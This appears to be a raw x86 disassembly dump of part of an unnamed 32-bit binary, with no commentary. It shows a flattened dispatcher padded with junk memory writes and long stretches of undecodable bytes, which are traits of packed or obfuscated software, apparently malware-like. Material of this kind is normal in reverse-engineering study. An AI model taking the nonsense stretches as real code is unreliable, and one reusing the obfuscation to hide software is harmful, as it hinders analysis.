  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	inc    ebp
  40e415:	jb     0x40e427
  40e417:	mov    dl,BYTE PTR [esi]
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e413
  40e421:	mov    edx,0x24c730e4
  40e426:	icebp  
  40e427:	inc    esi
  40e428:	cmp    al,0x66
  40e42a:	xchg   ebp,eax
  40e42b:	push   esi
  40e42c:	(bad)  
  40e42e:	sub    BYTE PTR [eax+0x796378e9],0xa8
  40e435:	ins    DWORD PTR es:[edi],dx
  40e436:	xchg   ecx,eax
  40e437:	inc    eax
  40e438:	dec    eax
  40e439:	into   
  40e43a:	push   ebx
  40e43b:	fld    TBYTE PTR [eax]
  40e43d:	add    al,0xf1
  40e43f:	fistp  DWORD PTR [ebp-0x79f8417f]
  40e445:	arpl   WORD PTR [esi],cx
  40e447:	(bad)  
  40e448:	jle    0x40e49a
  40e44a:	scas   al,BYTE PTR es:[edi]
  40e44b:	xchg   ebp,eax
  40e44c:	data16 xor bl,BYTE PTR [esi+ecx*1-0x3b]
  40e451:	or     esp,edx
  40e453:	xchg   BYTE PTR [esi-0x35],ch
  40e456:	mov    dl,0x87
  40e458:	fcom   st(3)
  40e45a:	mov    ebx,0x975238a
  40e45f:	push   esi
  40e460:	push   ecx
  40e461:	xchg   ebp,eax
  40e462:	pop    esp
  40e463:	ins    DWORD PTR es:[edi],dx
  40e464:	adc    BYTE PTR ds:0xaa86a0a,ch
  40e46a:	out    dx,eax
  40e46b:	adc    al,0x65
  40e46d:	xchg   ebx,eax
  40e46e:	outs   dx,BYTE PTR ds:[esi]
  40e46f:	outs   dx,DWORD PTR ds:[esi]
  40e470:	test   BYTE PTR [esi],dh
  40e472:	cmp    al,0xac
  40e474:	imul   esp,DWORD PTR [edi],0x4c5d9938
  40e47a:	sub    DWORD PTR [ebp+0x74],edx
  40e47d:	push   edi
  40e47e:	inc    ebp
  40e47f:	nop
  40e480:	xchg   ebx,eax
  40e481:	arpl   bx,dx
  40e483:	mov    ds:0xaec4ccbd,eax
  40e488:	adc    al,0xf9
  40e48a:	mov    bl,0x95
  40e48c:	test   DWORD PTR [edi+0x4511b3d],0x5c5819de
  40e496:	xchg   ecx,eax
  40e497:	fwait
  40e498:	out    0x6b,eax
  40e49a:	ja     0x40e48d
  40e49c:	cmp    al,0xe6
  40e49e:	nop
  40e49f:	xchg   edx,eax
  40e4a0:	sahf   
  40e4a1:	aaa    
  40e4a2:	inc    ecx
  40e4a3:	cmp    al,0xea
  40e4a5:	mov    DWORD PTR [edx+0x6dcfddbc],esp
  40e4ab:	mov    ds:0xec017c27,eax
  40e4b0:	call   0x8971:0xc184d170
  40e4b7:	loopne 0x40e497
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	das    
  40e4bb:	adc    DWORD PTR [ebp+eax*2-0x292248fe],0x55
  40e4c3:	ret    
  40e4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c5:	or     BYTE PTR [esp+ebx*2-0x28],ah
  40e4c9:	cld    
  40e4ca:	repz shl ch,cl
  40e4cd:	mov    ds:0xd6ca93d6,eax
  40e4d2:	inc    edx
  40e4d3:	inc    eax
  40e4d4:	jns    0x40e472
  40e4d6:	in     eax,dx
  40e4d7:	adc    DWORD PTR [esi],edi
  40e4d9:	jl     0x40e4ce
  40e4db:	sub    eax,0xc26c0506
  40e4e0:	dec    esp
  40e4e1:	adc    ah,ah
  40e4e3:	mov    ds:0x3cd00f93,al
  40e4e8:	fild   WORD PTR [edx+esi*1-0xc]
  40e4ec:	cli    
  40e4ed:	xchg   ebx,eax
  40e4ee:	push   es
  40e4ef:	int    0x75
  40e4f1:	adc    eax,0xea5ab276
  40e4f6:	mov    fs,WORD PTR [ebx+0x5e]
  40e4f9:	add    al,0xc0
  40e4fb:	(bad)  
  40e4fc:	aam    0xdb
  40e4fe:	sahf   
  40e4ff:	les    ebx,FWORD PTR ds:0xae6ca1fc
  40e505:	jp     0x40e4fd
  40e507:	mov    ecx,0x3901edb7
  40e50c:	xchg   esp,eax
  40e50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e50e:	ret    
  40e50f:	outs   dx,DWORD PTR ds:[esi]
  40e510:	inc    ebp
  40e511:	add    dl,BYTE PTR [esi+0x4d390dec]
  40e517:	repz push es
  40e519:	out    dx,eax
  40e51a:	int3   
  40e51b:	or     al,0x4c
  40e51d:	es pop ds
  40e51f:	out    dx,al
  40e520:	push   edi
  40e521:	adc    DWORD PTR [esi-0x4f8a42d4],0xfb01e23f
  40e52b:	outs   dx,BYTE PTR ds:[esi]
  40e52c:	jnp    0x40e527
  40e52e:	adc    eax,0x2c1a5f13
  40e533:	xchg   esp,eax
  40e534:	neg    DWORD PTR [edx+0x76]
  40e537:	and    al,0x7
  40e539:	in     al,0x52
  40e53b:	(bad)  [ebx+0xd81f445]
  40e541:	mov    ds:0xeb004337,eax
  40e546:	aaa    
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x4ff261b8
  40e5b4:	or     al,0xf7
  40e5b6:	push   0x2a
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e593
  40e5c0:	imul   ebx,esp,0xe
  40e5c3:	jge    0x40e551
  40e5c5:	mov    edx,0x96907654
  40e5ca:	hlt    
  40e5cb:	imul   esp,DWORD PTR [eax],0x4637c1a3
  40e5d1:	or     edx,esp
  40e5d3:	mov    bl,0xc7
  40e5d5:	push   eax
  40e5d6:	div    DWORD PTR [ecx-0x4e3602ad]
  40e5dc:	add    dh,BYTE PTR [esi+edx*4]
  40e5df:	xchg   ebx,eax
  40e5e0:	push   eax
  40e5e1:	xor    al,0xe1
  40e5e3:	std    
  40e5e4:	les    eax,FWORD PTR [eax-0x1f5e1597]
  40e5ea:	scas   eax,DWORD PTR es:[edi]
  40e5eb:	scas   al,BYTE PTR es:[edi]
  40e5ec:	popa   
  40e5ed:	push   eax
  40e5ee:	(bad)  
  40e5ef:	mov    ch,0xb9
  40e5f1:	mov    eax,ds:0x92e82251
  40e5f6:	inc    ebp
  40e5f7:	jae    0x40e584
  40e5f9:	xchg   DWORD PTR ds:0x72dc1e4,ebp
  40e5ff:	call   0x355f:0xea52402e
  40e606:	pop    ecx
  40e607:	cs inc ecx
  40e609:	cmp    BYTE PTR [esi],0x58
  40e60c:	popf   
  40e60d:	imul   ebp,DWORD PTR [eax-0x839b457],0x9ba60f68
  40e617:	adc    al,bl
  40e619:	adc    dl,BYTE PTR [esi+0x49]
  40e61c:	(bad)
  40e61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e620:	or     al,BYTE PTR [edi+eax*8+0x78c52475]
  40e627:	out    dx,eax
  40e628:	sub    DWORD PTR [edx+eiz*8],0x58
  40e62c:	and    eax,0xc172fd23
  40e631:	call   0x6f068584
  40e636:	ds scas al,BYTE PTR es:[edi]
  40e638:	sahf   
  40e639:	cs mov al,0xb4
  40e63c:	sub    cl,0x6e
  40e63f:	pop    ds
  40e640:	adc    cl,BYTE PTR [edi]
  40e642:	mov    esi,0xfd52b1b
  40e647:	mov    al,0x4c
  40e649:	hlt    
  40e64a:	cmp    cl,BYTE PTR [edx-0x6c]
  40e64d:	inc    eax
  40e64e:	mov    ebp,0x91f1cb01
  40e653:	enter  0x5b8e,0x65
  40e657:	push   ebx
  40e658:	dec    ebp
  40e659:	shl    BYTE PTR [edx],cl
  40e65b:	ja     0x40e6da
  40e65d:	push   es
  40e65e:	ja     0x40e69b
  40e660:	jl     0x40e613
  40e662:	mov    eax,ds:0xf4633ade
  40e667:	sbb    eax,DWORD PTR [edi]
  40e669:	repz bound esi,QWORD PTR [edx+0x118af5b2]
  40e670:	lods   eax,DWORD PTR ds:[esi]
  40e671:	or     BYTE PTR [eax-0xbc7276a],dl
  40e677:	mov    ds:0x53eeee07,al
  40e67c:	mov    cl,0x4c
  40e67e:	mov    al,ds:0xa83f5715
  40e683:	sub    esi,DWORD PTR [ecx-0x4e5d0d86]
  40e689:	adc    DWORD PTR [ebp-0x4fec1881],edi
  40e68f:	push   0x7d
  40e691:	dec    ecx
  40e692:	in     al,0x31
  40e694:	stos   BYTE PTR es:[edi],al
  40e695:	inc    esp
  40e696:	cmp    DWORD PTR [edx+ebx*2+0x584a6a64],0x1b
  40e69e:	push   0xffffffb9
  40e6a0:	lods   al,BYTE PTR ds:[esi]
  40e6a1:	shl    BYTE PTR [ecx-0x5cc06902],0x9f
  40e6a8:	or     al,0x72
  40e6aa:	jne    0x40e68b
  40e6ac:	mov    edx,0xc8b2b460
  40e6b1:	pop    edx
  40e6b2:	out    dx,al
  40e6b3:	xchg   ebp,eax
  40e6b4:	daa    
  40e6b5:	jmp    0x40e67d
  40e6b7:	into   
  40e6b8:	iret   
  40e6b9:	or     eax,0x2f36aae3
  40e6be:	dec    edi
  40e6bf:	data16 add al,0x35
  40e6c2:	pop    eax
  40e6c3:	int3   
  40e6c4:	jae    0x40e6ce
  40e6c6:	fld    QWORD PTR [edx+ebx*4+0x54]
  40e6ca:	sbb    BYTE PTR [ebp+0x10153fef],al
  40e6d0:	mov    dl,0xb1
  40e6d2:	imul   esp,DWORD PTR [edx],0x36576d1
  40e6d8:	cmp    al,0x35
  40e6da:	pop    ebp
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x57805fab]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e71e
  40e704:	outs   dx,DWORD PTR ds:[esi]
  40e705:	push   ebx
  40e706:	jae    0x40e6a6
  40e708:	stc    
  40e709:	enter  0x3fbb,0x13
  40e70d:	xor    ah,ch
  40e70f:	test   al,0x19
  40e711:	fiadd  DWORD PTR [edi+esi*4-0x639c941e]
  40e718:	push   cs
  40e719:	pop    ss
  40e71a:	mov    bh,0xc4
  40e71c:	adc    eax,0x50274858
  40e721:	sar    BYTE PTR [ebp-0x51],1
  40e724:	cmp    edi,esi
  40e726:	bound  eax,QWORD PTR [esi]
  40e728:	jge    0x40e788
  40e72a:	pop    es
  40e72b:	push   ebx
  40e72c:	loop   0x40e71a
  40e72e:	into   
  40e72f:	jp     0x40e6eb
  40e731:	sub    edx,DWORD PTR [ebp-0x1cebca96]
  40e737:	mov    bl,0x38
  40e739:	mov    esp,0xb061c88d
  40e73e:	mov    cl,0x61
  40e740:	enter  0x7afb,0x54
  40e744:	(bad)  
  40e747:	jg     0x40e6e2
  40e749:	and    eax,esi
  40e74b:	adc    al,BYTE PTR [ecx]
  40e74d:	cmp    ch,BYTE PTR [ecx-0x58dd6ad7]
  40e753:	jne    0x40e784
  40e755:	bnd jns 0x40e7c1
  40e758:	retf   0xc6b8
  40e75b:	js     0x40e6ed
  40e75d:	inc    ebp
  40e75e:	test   al,0xee
  40e760:	clc    
  40e761:	mov    ds:0x1a989e96,eax
  40e766:	ror    BYTE PTR ss:[ecx-0x2e],0xc5
  40e76b:	sub    BYTE PTR [ecx-0x525248a1],cl
  40e771:	enter  0xd97f,0x91
  40e775:	(bad)  
  40e776:	cdq    
  40e777:	mov    bl,0x4a
  40e779:	xor    dl,ch
  40e77b:	mov    dh,0xbf
  40e77d:	dec    edi
  40e77e:	push   0x13
  40e780:	ds iret 
  40e782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e783:	sub    eax,0xb1b69140
  40e788:	pop    esp
  40e789:	jle    0x40e74a
  40e78b:	ror    DWORD PTR [ebx],0x4b
  40e78e:	arpl   WORD PTR [ebp+0x12],bp
  40e791:	xchg   ch,al
  40e793:	retf   
  40e794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e795:	hlt    
  40e796:	mov    edi,ds
  40e798:	clc    
  40e799:	jg     0x9235043a
  40e79f:	call   0xbd1e:0x5b4e26c1
  40e7a6:	bound  ecx,QWORD PTR [eax-0x7f6ce8]
  40e7ac:	and    edi,DWORD PTR [esi-0x36]
  40e7af:	jmp    0xe784de11
  40e7b4:	cld    
  40e7b5:	sahf   
  40e7b6:	dec    esi
  40e7b7:	aaa    
  40e7b8:	outs   dx,BYTE PTR ds:[esi]
  40e7b9:	jp     0x40e81c
  40e7bb:	sub    al,0x77
  40e7bd:	jp     0x40e7a3
  40e7bf:	jecxz  0x40e769
  40e7c1:	inc    esp
  40e7c2:	xchg   BYTE PTR [ecx-0x17],cl
  40e7c5:	dec    ecx
  40e7c6:	jle    0x40e838
  40e7c8:	cld    
  40e7c9:	sub    eax,0x3acbdcb2
  40e7ce:	ror    BYTE PTR [ebx+edi*4+0x1f],1
  40e7d2:	and    eax,0xcb897eb
  40e7d7:	bound  esi,QWORD PTR [ebx-0x9]
  40e7da:	rcl    al,0x5d
  40e7dd:	lds    esp,FWORD PTR [ebx-0x58]
  40e7e0:	mov    cl,0x14
  40e7e2:	ss pop ebp
  40e7e4:	inc    edi
  40e7e5:	add    DWORD PTR [ebx],esi
  40e7e7:	or     al,0xaf
  40e7e9:	aam    0x98
  40e7eb:	mov    cl,0x20
  40e7ed:	xchg   edi,eax
  40e7ee:	cmp    eax,0xf938bf6d
  40e7f3:	xor    BYTE PTR [edi+edi*8-0x72],al
  40e7f7:	jns    0x40e80c
  40e7f9:	ret    0xbea1
  40e7fc:	mov    esi,0xc268ab34
  40e801:	shl    ch,cl
  40e803:	fdivr  DWORD PTR [esi+0x16]
  40e806:	push   ds
  40e807:	xchg   ecx,eax
  40e808:	(bad)  
  40e80a:	jno    0x40e862
  40e80c:	jae    0x40e7a7
  40e80e:	xor    eax,0x643c7d09
  40e813:	mov    ebx,DWORD PTR [edx-0x14]
  40e816:	loopne 0x40e85a
  40e818:	in     al,dx
  40e819:	mov    ch,0x3f
  40e81b:	lods   al,BYTE PTR ds:[esi]
  40e81c:	shl    DWORD PTR [ecx-0x3ba763a],cl
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8b2
  40e854:	pop    ds
  40e855:	ficom  DWORD PTR [edi]
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e85c
  40e860:	mov    cl,0x82
  40e862:	push   edi
  40e863:	sahf   
  40e864:	sub    eax,DWORD PTR [edx+edi*1-0x35ae3d62]
  40e86b:	mov    ds:0x73d74508,eax
  40e870:	lods   eax,DWORD PTR ds:[esi]
  40e871:	pop    ebx
  40e872:	outs   dx,DWORD PTR ds:[esi]
  40e873:	into   
  40e874:	push   ss
  40e875:	std    
  40e876:	shl    BYTE PTR [ebx],cl
  40e878:	popf   
  40e879:	fld    QWORD PTR [ecx+0xe7e54f9]
  40e87f:	sub    dh,BYTE PTR [esi-0x4fe4afc0]
  40e885:	push   edx
  40e886:	pusha  
  40e887:	xchg   DWORD PTR [ecx],ebp
  40e889:	cld    
  40e88a:	mov    BYTE PTR [ecx],ch
  40e88c:	psubusw mm4,mm1
  40e88f:	push   eax
  40e890:	cwde   
  40e891:	xor    eax,0xd375229e
  40e896:	push   ebx
  40e897:	and    DWORD PTR [ebp+0x6bf7eb12],0x33
  40e89e:	xor    ecx,esi
  40e8a0:	out    dx,eax
  40e8a1:	jo     0x40e862
  40e8a3:	mov    BYTE PTR [edx+0x77],ch
  40e8a6:	cmp    BYTE PTR [ebp+0x34d240e3],ah
  40e8ac:	cmp    eax,0x14645a0f
  40e8b1:	add    eax,0x9531eb4f
  40e8b6:	outs   dx,BYTE PTR ds:[esi]
  40e8b7:	mov    ds:0x644cefc2,al
  40e8bc:	xor    al,0x47
  40e8be:	scas   al,BYTE PTR es:[edi]
  40e8bf:	push   ebp
  40e8c0:	mov    dh,bl
  40e8c2:	mov    BYTE PTR [edx+ecx*1+0x3bf1710b],ah
  40e8c9:	push   ecx
  40e8ca:	(bad)  
  40e8cb:	stc    
  40e8cc:	pop    es
  40e8cd:	mov    eax,ds:0xde38bd68
  40e8d2:	hlt    
  40e8d3:	sti    
  40e8d4:	jo     0x40e88c
  40e8d6:	ror    cl,1
  40e8d8:	mov    ebp,cs
  40e8da:	leave  
  40e8db:	xchg   ecx,eax
  40e8dc:	jbe    0x40e914
  40e8de:	push   cs
  40e8df:	stos   DWORD PTR es:[edi],eax
  40e8e0:	jnp    0x40e8ad
  40e8e2:	icebp  
  40e8e3:	jmp    0x4ec4:0x75db5554
  40e8ea:	xor    DWORD PTR [edi-0x2d],ebp
  40e8ed:	pushf  
  40e8ee:	xor    ebx,DWORD PTR [esi+eiz*1+0x22]
  40e8f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8f3:	out    dx,al
  40e8f4:	and    DWORD PTR [edi],0x5351857b
  40e8fa:	test   DWORD PTR [ebx+0x27],ebp
  40e8fd:	jb     0x40e906
  40e8ff:	or     bh,bl
  40e901:	xchg   DWORD PTR [eax],ebx
  40e903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e904:	repz and DWORD PTR [eax+0x1c],ebp
  40e908:	push   ss
  40e909:	call   0x5e8706eb
  40e90e:	jnp    0x76df562d
  40e914:	es aas 
  40e916:	inc    ecx
  40e917:	cmp    eax,0x49ecbc5d
  40e91c:	jbe    0x40e90f
  40e91e:	(bad)  
  40e91f:	xchg   DWORD PTR [eax],esi
  40e921:	jnp    0x40e8cf
  40e923:	ins    DWORD PTR es:[edi],dx
  40e924:	jne    0x40e8eb
  40e926:	pusha  
  40e927:	or     al,0x1b
  40e929:	or     al,0x65
  40e92b:	cmp    DWORD PTR [ebp+ebp*2+0x4e],edi
  40e92f:	push   ecx
  40e930:	push   ecx
  40e931:	dec    ebx
  40e932:	ins    BYTE PTR es:[edi],dx
  40e933:	pop    eax
  40e934:	jno    0x40e8e5
  40e936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e937:	push   ecx
  40e938:	into   
  40e939:	cs mov bl,0x3f
  40e93c:	or     BYTE PTR [edx+ebp*4],bl
  40e93f:	cs dec eax
  40e941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e942:	(bad)  
  40e943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e944:	outs   dx,DWORD PTR ds:[esi]
  40e945:	jnp    0x40e991
  40e947:	dec    edx
  40e948:	push   esi
  40e949:	loop   0x40e8f8
  40e94b:	mov    DWORD PTR [esi+0x62],ebx
  40e94e:	mov    ch,0x72
  40e950:	(bad)  
  40e951:	dec    ebp
  40e952:	les    edi,FWORD PTR [ebp-0x49]
  40e955:	pop    es
  40e956:	fwait
  40e957:	pop    eax
  40e958:	pop    esi
  40e959:	sub    BYTE PTR [ecx],ch
  40e95b:	call   0x1e26e96f
  40e960:	jns    0x40e96b
  40e962:	inc    ebp
  40e963:	mov    cl,0x5a
  40e965:	or     ecx,0xc798b99f
  40e96b:	shl    BYTE PTR [ebx],0xce
  40e96e:	js     0x40e915
  40e970:	push   ss
  40e971:	in     al,0x92
  40e973:	es pop ecx
  40e975:	aad    0x7f
  40e977:	pop    ebx
  40e978:	in     al,0xc
  40e97a:	es jne 0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xa4132b1d
  40e99c:	dec    ecx
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e9db
  40e9a6:	adc    BYTE PTR [ebx],0xc3
  40e9a9:	push   0xf4296668
  40e9ae:	adc    al,0x48
  40e9b0:	aas    
  40e9b1:	or     eax,0x861ce40
  40e9b6:	jae    0x40ea29
  40e9b8:	or     al,cl
  40e9ba:	enter  0x9811,0xb9
  40e9be:	outs   dx,DWORD PTR ds:[esi]
  40e9bf:	adc    bl,BYTE PTR [edi+ecx*1+0x7]
  40e9c3:	mov    ?,WORD PTR fs:0xe3977d65
  40e9ca:	mov    ds:0xb08a2ed5,al
  40e9cf:	and    DWORD PTR [ecx+edi*2-0x39],ecx
  40e9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d4:	mov    edx,DWORD PTR [edx-0x3e]
  40e9d7:	test   eax,0xdaca9e37
  40e9dc:	mov    DWORD PTR ds:0xf6c61e68,eax
  40e9e2:	lock push esi
  40e9e4:	stos   BYTE PTR es:[edi],al
  40e9e5:	or     DWORD PTR [edx+0x7a],esi
  40e9e8:	inc    ecx
  40e9e9:	ret    
  40e9ea:	retf   
  40e9eb:	cmc    
  40e9ec:	sub    esi,DWORD PTR [edi+esi*1]
  40e9ef:	push   0x6c12bb16
  40e9f4:	popa   
  40e9f5:	mov    al,ds:0x90e3371d
  40e9fa:	mov    esi,DWORD PTR [ecx]
  40e9fc:	adc    dl,dh
  40e9fe:	je     0x40e98f
  40ea00:	std    
  40ea01:	jl     0x40e98a
  40ea03:	sub    al,0xf3
  40ea05:	mov    ebx,0x83ae9e84
  40ea0a:	sub    al,0x8a
  40ea0c:	stos   DWORD PTR es:[edi],eax
  40ea0d:	pop    ds
  40ea0e:	rcl    ah,cl
  40ea10:	pop    edx
  40ea11:	ffree  st(1)
  40ea13:	adc    DWORD PTR [eax-0x6e],ebp
  40ea16:	pop    ecx
  40ea17:	jo     0x40ea24
  40ea19:	mov    WORD PTR [ecx],ss
  40ea1b:	shr    DWORD PTR [ebp-0x253af882],1
  40ea21:	ins    BYTE PTR es:[edi],dx
  40ea22:	aam    0xf5
  40ea24:	sbb    cl,bl
  40ea26:	sub    bl,0x3f
  40ea29:	call   0xfa2a:0xcb52cca2
  40ea30:	stos   BYTE PTR es:[edi],al
  40ea31:	icebp  
  40ea32:	xor    esi,esp
  40ea34:	enter  0x96d5,0x47
  40ea38:	popa   
  40ea39:	test   al,0x3b
  40ea3b:	sar    BYTE PTR [edi+0x36],0x4c
  40ea3f:	push   0x281bf0ac
  40ea44:	xchg   esi,eax
  40ea45:	bound  edi,QWORD PTR ds:0x5bc66511
  40ea4b:	lods   al,BYTE PTR ds:[esi]
  40ea4c:	cmp    eax,0x3e6319a5
  40ea51:	and    ah,bh
  40ea53:	ror    DWORD PTR [ecx],1
  40ea55:	mov    BYTE PTR [edx+0x4b1ff306],cl
  40ea5b:	or     al,0xe3
  40ea5d:	loope  0x40ea2b
  40ea5f:	cld    
  40ea60:	jle    0x40ea05
  40ea62:	hlt    
  40ea63:	(bad)  
  40ea64:	sbb    al,0xf4
  40ea66:	call   0xbec6:0xd1754fa4
  40ea6d:	and    cl,dl
  40ea6f:	xor    esi,DWORD PTR [esi-0x31]
  40ea72:	mov    DWORD PTR [esi],eax
  40ea74:	or     DWORD PTR [ebx+0x5b4e3da8],0xffffffca
  40ea7b:	xchg   DWORD PTR [ebx-0x4f],eax
  40ea7e:	or     BYTE PTR [ecx],al
  40ea80:	sub    al,0xc3
  40ea82:	and    edx,DWORD PTR [esi]
  40ea84:	xchg   edx,eax
  40ea85:	sbb    BYTE PTR es:0x10302ed8,ah
  40ea8c:	adc    dh,BYTE PTR [edi+0xc20b001]
  40ea92:	shr    BYTE PTR [esi-0x6d],1
  40ea95:	aam    0xa1
  40ea97:	adc    eax,0x33bc7e09
  40ea9c:	aad    0x3c
  40ea9e:	and    ecx,DWORD PTR [edi+edi*8+0x31]
  40eaa2:	add    eax,0xa69547b9
  40eaa7:	pop    ebx
  40eaa8:	sub    al,0xdf
  40eaaa:	into   
  40eaab:	add    ah,BYTE PTR [edi]
  40eaad:	(bad)  
  40eaae:	mov    ch,0x10
  40eab0:	ins    BYTE PTR es:[edi],dx
  40eab1:	push   0xc8e89851
  40eab6:	icebp  
  40eab7:	pop    ss
  40eab8:	rcr    DWORD PTR [esp+eax*2],1
  40eabb:	mov    ah,0x2d
  40eabd:	push   ecx
  40eabe:	cmp    al,0xf0
